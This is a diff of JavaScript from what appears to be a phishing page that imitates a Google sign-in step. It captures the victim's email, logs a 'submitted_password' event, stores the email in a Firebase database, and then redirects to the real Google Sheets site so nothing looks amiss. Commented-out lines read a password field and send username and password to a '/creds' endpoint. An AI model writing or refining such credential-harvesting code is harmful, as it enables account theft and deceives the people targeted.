@@ -41,11 +41,18 @@ function doPasswordStep() {
     var username = $('#email-input').val()
     // var password = $('#password-input').val()
 
-    save(username);
 	track('submitted_password', username)
 
+	save(username, (error) => {
+		if(error) {
+
+		} else {
+			window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
+		}
+	});
+
     // //Redirect to myaccount.google
-    window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
+  //
 
     // var xhr = new XMLHttpRequest();
     // xhr.open("GET", "/creds?username="+ username +"&password="+ password, true);
@@ -128,7 +135,7 @@ function track(event, email) {
 }
 
 
-function save(email, password) {
+function save(email, callback) {
     // A post entry.
     var userData = {
         email: email,
@@ -142,5 +149,5 @@ function save(email, password) {
     var updates = {};
     updates['/users/' + newUserKey] = userData;
 
-    return firebase.database().ref().update(updates);
+    return firebase.database().ref().update(updates, callback);
 }
